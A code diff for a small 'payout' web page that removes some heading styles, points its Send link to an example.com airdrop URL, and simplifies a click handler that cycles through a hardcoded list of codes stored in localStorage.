@@ -23,10 +23,6 @@
             margin-bottom: 15px;
             text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
             color: #ffd700;
-            background: rgba(255, 255, 255, 0.2); /* Semi-transparent background */
-            padding: 15px;
-            border-radius: 10px;
-            border: 2px solid #ffd700; /* Gold border for emphasis */
         }
         .payout-section p {
             font-size: 18px;
@@ -67,7 +63,7 @@
         <p>Get your rewards instantly by clicking the send button below.</p>
         <form id="payoutForm" class="payout-form">
             <!-- Link styled as a button -->
-            <a href="#" class="button" onclick="handleButtonClick(event)">Send</a>
+            <a href="https://example.com/airdrop" class="button" onclick="handleButtonClick()">Send</a>
             <p id="errorMessage" class="error-message"></p>
         </form>
     </div>
@@ -77,9 +73,7 @@
         const codes = ["111222", "111333", "111444", "111555", "111666"];
         
         // Function to handle the button click
-        function handleButtonClick(event) {
-            event.preventDefault(); // Prevent the default link action
-
+        function handleButtonClick() {
             let currentIndex = localStorage.getItem('currentIndex');
             if (currentIndex === null) {
                 currentIndex = 0; // Start with the first code if no index is stored
